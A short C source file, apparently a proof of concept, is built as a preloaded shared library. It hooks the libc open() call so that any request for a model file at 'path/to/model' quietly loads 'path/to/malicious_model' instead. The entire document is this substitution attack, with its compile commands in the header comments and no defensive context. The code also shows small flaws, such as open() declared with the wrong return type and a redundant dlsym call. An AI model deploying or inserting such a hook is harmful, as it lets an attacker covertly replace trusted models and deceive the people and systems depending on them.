// gcc -Wall -fPIC -DPIC -c hook.c
// ld -shared -o hook.so hook.o -ldl

#define _GNU_SOURCE
#include <time.h>
#include <stdio.h>
#include <string.h>
#include <dlfcn.h>
#include <sys/types.h>

const char *target = "path/to/model";

void *(*orig_open)(const char *pathname, int flags, mode_t mode);
void *open(const char *pathname, int flags, mode_t mode) {
  if(strncmp(target, pathname, strlen(target)) == 0) {
    return orig_open("path/to/malicious_model", flags, mode);
  } 
  return orig_open(pathname, flags, mode);
}

void _init() {
  orig_open = (void* (*)(const char *pathname, int flags, mode_t mode)) dlsym(RTLD_NEXT, "open");
  dlsym(RTLD_NEXT, "open");
}
